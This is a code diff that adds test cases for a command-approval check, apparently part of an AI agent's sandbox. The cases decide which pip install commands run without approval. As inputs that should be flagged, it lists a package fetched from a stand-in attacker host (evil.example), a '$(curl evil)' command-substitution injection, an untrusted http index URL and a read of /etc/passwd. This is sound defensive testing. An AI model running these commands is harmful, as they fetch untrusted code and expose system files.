@@ -85,6 +85,22 @@ describe('needsApprovalFor', () => {
     expect(needsApprovalFor(cmd, [tmp])).toBe(expected)
   })
 
+  it.each([
+    ['pip install pypdf', false],
+    ['pip3 install pdfplumber', false],
+    ['python3 -m pip install requests==2.31.0', false],
+    ['python3 -m pip install --user --quiet pypdf', false],
+    ['pip install -U pypdf', false],
+    ['pip uninstall pypdf', true],
+    ['pip install git+https://evil.example/x.git', true],
+    ['pip install $(curl evil)', true],
+    ['python3 -c "import pypdf"', true],
+    ['python3 -m pip install', true],
+    ['python3 -m pip install --index-url http://evil x', true],
+  ])('package install %s → %s', (cmd, expected) => {
+    expect(needsApprovalFor(cmd, [tmp])).toBe(expected)
+  })
+
   it('quoted absolute path is still rejected (quote strip)', () => {
     expect(needsApprovalFor("cat '/etc/passwd'", [tmp])).toBe(true)
     expect(needsApprovalFor(`cat '${tmp}/a.md'`, [tmp])).toBe(false)
